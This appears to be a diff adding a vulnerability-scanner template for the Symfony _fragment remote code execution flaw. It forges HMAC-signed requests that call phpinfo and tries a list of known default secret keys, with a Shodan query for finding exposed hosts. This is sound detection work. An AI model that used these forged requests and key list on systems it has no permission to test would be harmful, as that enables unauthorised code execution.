@@ -1,0 +1,67 @@
+id: symfony-rce
+
+info:
+  name: Symfony _fragment - Default Key RCE
+  author: Yablargo
+  severity: critical
+  description: |
+    Symfony servers support a "/_fragment" command that allows clients to provide custom PHP commands and return the HTML output.
+    This template checks to see if they also use a popular default secret key for remote command execution.
+  reference: |
+    https://portswigger.net/daily-swig/symfony-based-websites-open-to-rce-attack-research-finds
+    https://medium.com/@m4cddr/how-i-got-rce-in-10-websites-26dd87441f22
+    https://al1z4deh.medium.com/how-i-hacked-28-sites-at-once-rce-5458211048d5
+    https://github.com/ambionics/symfony-exploits
+  metadata:
+    max-request: 12
+    shodan-query: http.html:"Symfony Profiler"
+    verified: true
+  tags: rce,symfony,misconfig
+
+variables:
+  badsecretkey: 'ThisIsAlmostCertainlyNotIt'
+  uri_part: '_fragment?_path=what%3D-1%26_controller%3Dphpinfo'
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","{{BaseURL}}/{{uri_part}}",badsecretkey))))}}'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 403"
+          - "contains(body, 'symfony')"
+        condition: and
+        internal: true
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","{{BaseURL}}/{{uri_part}}",secretkey))))}}'
+
+    payloads:
+      secretkey:
+        - ThisTokenIsNotSoSecretChangeIt
+        - ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt
+        - xxxxxxxaxaxaxa
+        - 97829395eda62d81f37980176ded371a
+        - YOUR_APP_SECRET
+        - 879a6adeceeccbdc835a19f7e3aad7e8
+        - some_new_secret_123
+        - f96c2d666ace1278ec4c9e2304381bc3
+        - 7d41a4acde33432b1d51eae15a301550
+        - 236cd9304bb88b11e2bb4d56108dffa8
+        - 8cfa2bd0b50b7db00e9c186be68f7ce7465123
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'PHP Version')"
+          - "contains(body, 'PHP License')"
+          - "contains(body, 'symfony')"
+        condition: and
+# digest: 490a00463044022078356021f2821bfd002bb66e600d72fb8ba77f3cbdc358b01ee2731b318e8c8602201d64d03a03744411a55ec9eca20c9cd18011c1491933a19bd7087bbe1355cb04:922c64590222798bb761d5b6d8e72950
